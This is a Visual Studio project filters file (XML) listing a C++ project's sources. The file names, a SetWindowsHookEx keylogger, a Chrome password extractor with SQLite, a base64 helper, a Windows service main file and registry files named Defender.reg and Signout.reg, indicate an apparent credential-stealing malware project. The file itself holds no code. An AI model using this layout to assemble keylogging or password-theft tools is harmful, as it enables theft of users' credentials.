<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;hm;inl;inc;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
    <Filter Include="Source Files\chrome-passwords">
      <UniqueIdentifier>{8988a164-7025-4504-9313-0ccfe3b4cd4d}</UniqueIdentifier>
    </Filter>
    <Filter Include="Header Files\chrome-passwords">
      <UniqueIdentifier>{3be95d01-3cc7-4ec3-85e0-51808f49aea3}</UniqueIdentifier>
    </Filter>
    <Filter Include="Header Files\base64">
      <UniqueIdentifier>{24e10310-bc5a-46d9-8eea-79534ed84654}</UniqueIdentifier>
    </Filter>
    <Filter Include="Source Files\base64">
      <UniqueIdentifier>{4906109e-2212-40ab-b842-a3cc5f4194ff}</UniqueIdentifier>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <Text Include="ReadMe.txt" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="stdafx.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="targetver.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="chrome-passwords\src\sqlite3.h">
      <Filter>Header Files\chrome-passwords</Filter>
    </ClInclude>
    <ClInclude Include="chrome-passwords\src\targetver.h">
      <Filter>Header Files\chrome-passwords</Filter>
    </ClInclude>
    <ClInclude Include="base64\base64.h">
      <Filter>Header Files\base64</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="stdafx.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="SetWindowsHookEx-Keylogger.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="SampleServiceMain.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="chrome-passwords\src\chrome-passwords.cpp">
      <Filter>Source Files\chrome-passwords</Filter>
    </ClCompile>
    <ClCompile Include="chrome-passwords\src\sqlite3.c">
      <Filter>Source Files\chrome-passwords</Filter>
    </ClCompile>
    <ClCompile Include="base64\base64.cpp">
      <Filter>Source Files\base64</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <None Include="Defender.reg" />
    <None Include="Signout.reg" />
  </ItemGroup>
</Project>